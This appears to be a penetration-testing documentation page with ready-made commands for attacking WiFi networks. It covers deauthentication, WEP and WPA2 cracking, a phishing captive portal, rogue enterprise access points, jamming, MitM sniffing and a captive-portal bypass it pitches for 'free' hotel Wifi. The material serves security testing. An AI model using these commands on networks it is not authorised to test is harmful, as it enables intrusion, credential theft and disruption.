---
id: 01-wifi-penetration-testing
title: WiFi Penetration Testing Guide
sidebar_position: 2
---

# WiFi Penetration Testing Guide

## Index

1. [Basic commands](#1-basic-commands)
2. [Open networks](#2-open-networks)
   - [Captive portals](#21-captive-portals)
   - [Man in the Middle attack](#22-man-in-the-middle-attack)
3. [WEP cracking](#3-wep-cracking)
4. [WPA2-PSK cracking](#4-wpa2-psk-cracking)
   - [Cracking the 4-way-handshake](#41-cracking-the-4-way-handshake)
   - [PMKID attack](#42-pmkid-attack)
   - [AP-less attack](#43-ap-less-attack)
5. [WPA2-Enterprise](#5-wpa2-enterprise)
   - [Fake Access Points](#51-fake-access-points)
   - [Brute force](#52-brute-force)
   - [EAP methods supported](#53-eap-methods-supported)
6. [Other attacks](#6-other-attacks)
   - [Krack Attack and Frag Attack](#61-krack-attack-and-frag-attack)
   - [OSINT](#62-osint)
   - [Wifi Jamming](#63-wifi-jamming)
   - [Other frameworks](#64-other-frameworks)
7. [Post-exploitation](#7-post-exploitation)
   - [Attacking the router](#71-attacking-the-router)
   - [Types of scanners](#72-types-of-scanners)
   - [Spoofing](#73-spoofing)

---

## 1. Basic commands

#### Set environment variable

```bash
VARIABLE=value
```

#### Check interface mode

```bash
iwconfig $IFACE
```

#### Check interface status

```bash
ifconfig $IFACE
```

#### Set monitor mode

```bash
airmon-ng check kill
ifconfig $IFACE down
iwconfig $IFACE mode monitor
ifconfig $IFACE up
```

#### List networks

1. Set monitor mode
2. Run Airodump-ng

```bash
airodump-ng $IFACE -c $CHANNEL -e $ESSID
```

#### Deauthentication

1. Only one client

```bash
aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

2. An Access Point (= all the clients in the AP)

```bash
aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC $IFACE
```

#### Get hidden SSID with clients

1. List networks

List the networks using Airodump-ng and get the AP's MAC address ($AP_MAC) and one from a client ($CLIENT_MAC). Do not stop the capture.

2. Deauthenticate

In another terminal, deauthenticate a client or all of them. When Airodump-ng captures a handshake from this network, the name or ESSID will appear in the first terminal:

```bash
aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

#### Get hidden SSID without clients

1. List networks

List the networks using Airodump-ng and get the AP's MAC address ($AP_MAC) and one from a client ($CLIENT_MAC). Do not stop the capture.

2.a. Execute a dictionary attack

```bash
mdk3 $IFACE p -t $AP_MAC -f $DICTIONARY_PATH
```

2.b. Or execute a bruteforce attack

```bash
mdk3 $IFACE p -t $AP_MAC -c $AP_CHANNEL -b $CHARACTER_SET
```

For the character set it is possible to use *l* (lowercase letters), *u* (uppercase letters), *n* (numbers), *c* (lowercase+uppercase), *m* (lowercase+uppercase+numbers) or *a* (all printed).

---

## 2. Open networks

### 2.1. Captive portals

#### 2.1.1. Fake captive portals

1. Clone a website using [HTTrack](https://www.httrack.com/)

2. Install [Wifiphisher](https://github.com/wifiphisher/wifiphisher). Add the HTTrack result in a new folder in `wifiphisher/data/phishing-pages/new_page/html` and a configuration file in `wifiphisher/data/phishing-pages/new_page/config.ini`.

3. Recompile the project using `python setup.py install` or the binary in `bin`.

4. This command works correctly in the latest Kali release after installing hostapd:

```bash
cd bin && ./wifiphisher -aI $IFACE -e $ESSID --force-hostapd -p $PLUGIN -nE
```

#### 2.1.2. Bypass 1: MAC spoofing

The first method to bypass a captive portal is to change your MAC address to one of an already authenticated user.

1. Scan the network and get the list of IP and MAC addresses. You can use:

   - nmap
   - A custom script (Bash or Python)

2. Change your IP and MAC addresses. You can use:

   - macchanger
   - A custom script (Bash)

Also, you can use scripts to automate the process like:

- [Poliva script](https://raw.githubusercontent.com/poliva/random-scripts/master/wifi/hotspot-bypass.sh)
- [Hackcaptiveportals](https://github.com/systematicat/hack-captive-portals)

#### 2.1.3. Bypass 2: DNS tunnelling

A second method is creating a DNS tunnel. For this, it is necessary to have an accessible DNS server of your own. You can use this method to bypass the captive portal and get "free" Wifi in hotels, airports...

1. Check the domain names are resolved:

```bash
nslookup example.com
```

2. Create 2 DNS records (in [Digital Ocean](https://www.digitalocean.com/), [Afraid.org](http://freedns.afraid.org/)...):

   - One "A record": dns.$DOMAIN pointing to the $SERVER_IP (Example: dns.domain.com 139.59.172.117)
   - One "NS record": hack.$DOMAIN pointing to dns.$DOMAIN (Example: hack.domain.com dns.domain.com)

3. Execution in the server

```bash
iodined -f -c -P $PASS -n $SERVER_IP 10.0.0.1 hack.$DOMAIN
```

4. Check if it works correctly [here](https://code.kryo.se/iodine/check-it/)

5. Execution in the client

```bash
iodine -f -P $PASS $DNS_SERVER_IP hack.$DOMAIN
```

6. Create the tunnel

```bash
ssh -D 8080 $USER@10.0.0.1
```

### 2.2. Man in the Middle attack

Once you are in the network, you can test if it is vulnerable to Man in the Middle attacks.

1. ARP Spoofing attack using [Ettercap](https://www.ettercap-project.org/)
2. Sniff the traffic using Wireshark or TCPdump
3. Analyze the traffic using [PCredz](https://github.com/lgandx/PCredz) (Linux) or [Network Miner](https://www.netresec.com/?page=networkminer) (Windows)

---

## 3. WEP cracking

1. Start capture

```bash
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```

2. Accelerate the IV capture using *Fake authentication* + *Arp Request Replay Attack* + *Deauthenticate user*. Stop Airodump at ~100.000 different IVs

```bash
aireplay-ng -1 0 -e $AP_NAME -a $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -3 -b $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
```

3. Crack the password using Aircrack-ng

```bash
aircrack-ng $PCAP_FILE
```

---

## 4. WPA2-PSK cracking

### 4.1. Cracking the 4-way-handshake

1. Start capture

```bash
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```

2. Deauthenticate a user. Stop airodump capture when you see a message 'WPA handshake: $MAC'

```bash
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
```

3. Option 1: Crack the handshake using Aircrack-ng

```bash
aircrack-ng -w $WORDLIST capture.cap
```

You can get wordlists from [here](https://github.com/kennyn510/wpa2-wordlists).

4. Option 2: Crack the handshake using Pyrit

```bash
pyrit -r $PCAP_FILE analyze
pyrit -r $PCAP_FILE -o $CLEAN_PCAP_FILE strip
pyrit -i $WORDLIST import_passwords
pyrit eval
pyrit batch
pyrit -r $CLEAN_PCAP_FILE attack_db
```

### 4.2. PMKID attack

Follow these steps:

1. Install Hcxdumptool and Hcxtool.

2. Stop Network Manager

```bash
airmon-ng check kill
```

3. If you want to attack a specific MAC address

   - Create a text file ($FILTER_FILE) and add the MAC address without ":". You can use *sed* and redirect the output to a file:

```bash
echo $MAC | sed 's/://g' > $FILTER_FILE
```

   - Capture PMKID

```bash
hcxdumptool -i $IFACE -o $PCAPNG_FILE --enable_status=1 --filterlist=$FILTER_FILE --filtermode=2
```

4. Create $HASH_FILE

```bash
hcxpcaptool -z $HASH_FILE $PCAPNG_FILE
```

The structure of each line is: PMKID \* ROUTER MAC \* STATION \* ESSID (check at: https://www.rapidtables.com/convert/number/hex-to-ascii.html)

5. Crack it using Hashcat (option 16800)

```bash
hashcat -a 0 -m 16800 $HASH_FILE $WORDLIST --force
```

### 4.3. AP-less attack

If you have access to a client device with the Wifi connection turned on but there is not a network around, you can still attack that network if the client device has previously connected to it.

For that, you have to create a Fake Access Point using hostapd with a [configuration file](https://gist.github.com/nickpegg/059ad1e0a0a14671892e), with any password but the same network name. Create the fake network, the client device will try to connect to it and you get the 4-way handshake as in [section 4.1 of this guide](#41-cracking-the-4-way-handshake).

---

## 5. WPA2-Enterprise

### 5.1. Fake Access Points

#### Virtual machines download

| Operating system | Platform | Credentials | Size | Link |
| ---------------- | -------- | ----------- | ---- | ---- |
| Ubuntu 16.04.5   | VMware   | ricardojoserf:wifi | 3.25 GB | [MEGA](https://mega.nz/file/5glEzKKa#SCmh95KdM28uPt-h8J5xtu4pQrnn_3yrI2kLnaSq3nw) |
| Kali 2019.1      | VMware   | root:wifi          | 4.99 GB | [MEGA](https://mega.nz/file/11sDVSoB#KMq5yWvuGUFwGhqzd-5hE21Xsfxsp0UMauQKntMbs38) |
| Ubuntu 16.04.5   | VirtualBox (OVA) | ricardojoserf:wifi | 3.18 GB | [MEGA](https://mega.nz/file/N5slGZLC#Dx1rBEMoNOAqdaEpB7BHhRi26HDxkJlyoQNk0frWDkw) |
| Kali 2019.1      | VirtualBox (OVA) | root:wifi        | 5.56 GB | [MEGA](https://mega.nz/file/pl0j3ZwC#zE_skdeUCLoOSQHvtHrvejmA4Ktn9Qk0Sk0qI1d4KeI) |

#### Local installation

In case you do not want to use the virtual machine, you can install everything using:

```bash
git clone https://github.com/ricardojoserf/WPA_Enterprise_Attack
cd WPA_Enterprise_Attack && sudo sh install.sh
```

#### Hostapd & Freeradius-wpe

Start the Access Point using:

```bash
sh freeradius_wpe_init.sh $AP_NAME $INTERFACE
```

When a client connects, read logs with:

```bash
sh freeradius_wpe_read.sh
```

#### Hostapd-wpe

```bash
sh hostapd_wpe_init.sh $AP_NAME $INTERFACE
```

### 5.2. Brute force

- [Airhammer](https://github.com/Wh1t3Rh1n0/air-hammer)

### 5.3. EAP methods supported

Find supported EAP methods:

- [EAP_buster](https://github.com/blackarrowsec/EAP_buster)

---

## 6. Other attacks

### 6.1. Krack Attack and Frag Attack

These are two advanced attacks discovered by [Mathy Vanhoef](https://twitter.com/vanhoefm):

- [Krack Attack Scripts](https://github.com/vanhoefm/krackattacks-scripts) - Explained on [this website](https://www.krackattacks.com/)
- [Frag Attack Scripts](https://github.com/vanhoefm/fragattacks) - Explained on [this website](https://www.fragattacks.com/)

### 6.2. OSINT

- [Wigle](https://wigle.net/)

### 6.3. Wifi Jamming

- [Wifijammer](https://github.com/DanMcInerney/wifijammer) - This program can send deauthentication packets to both APs and clients.

An example to deauthenticate all the devices except a Fake Access Point:

```bash
sudo ./wifijammer -i $IFACE -s $FAKE_AP_MAC
```

### 6.4. Other frameworks

Linux:

- [Sniffair](https://github.com/Tylous/SniffAir)
- [Wifi Pumpkin](https://github.com/P0cL4bs/wifipumpkin3) - Framework for Rogue WiFi Access Point Attack
- [Eaphammer](https://github.com/s0lst1c3/eaphammer) - Framework for Fake Access Points
- [WEF](https://github.com/D3Ext/WEF) - Framework for different types of attacks for WPA/WPA2 and WEP, automated hash cracking and more

Windows:

- [Acrylic](https://www.acrylicwifi.com) - Useful for recon phase
- [Ekahau](https://www.ekahau.com/) - Useful for Wi-Fi planning
- [Vistumbler](https://www.vistumbler.net/) - Useful for wardriving

---

## 7. Post-exploitation

Once you are connected to the network.

### 7.1. Attacking the router

- [Routersploit](https://github.com/threat9/routersploit) - Exploitation Framework for Embedded Devices - Test "use scanners/autopwn"

### 7.2. Types of scanners

- Nmap/Zenmap - Security Scanner, Port Scanner, & Network Exploration Tool
- Masscan - The faster version of nmap (it can break things, so be careful)
- Netdiscover - ARP sniffing. Very useful if the networks are very well segmented

### 7.3. Spoofing

- Ettercap - Check if you can do a MitM attack and sniff all the traffic in the network
